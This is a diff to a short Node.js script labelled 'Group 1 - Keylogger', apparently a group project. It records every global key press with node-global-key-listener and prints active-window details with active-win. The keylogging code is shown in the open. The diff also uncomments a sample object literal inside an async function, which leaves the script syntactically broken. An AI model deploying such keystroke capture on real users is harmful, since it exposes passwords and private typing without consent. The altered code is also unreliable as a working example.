@@ -1,13 +1,15 @@
+// Group 1 - Keylogger 
 var GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
 
 const v = new GlobalKeyboardListener();
-// I am groot
+
 //Log every key that's pressed.
 v.addListener(function (e, down) {
     console.log(
         `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP  "} [${e.rawKey._nameRaw}]`
+        
     );
-});
+})
 
 //Capture Windows + Space on Windows and Command + Space on Mac
 v.addListener(function (e, down) {
@@ -40,9 +42,8 @@ const activeWindow = require('active-win');
 
 (async () => {
 	console.log(await activeWindow(options));
-	/*
 	{
-		title: 'Unicorns - Google Search',
+		title: 'Keyloggers-Group 1',
 		id: 5762,
 		bounds: {
 			x: 0,
@@ -59,7 +60,7 @@ const activeWindow = require('active-win');
 		url: 'https://sindresorhus.com/unicorn',
 		memoryUsage: 11015432
 	}
-	*/
+
 })();
 
 
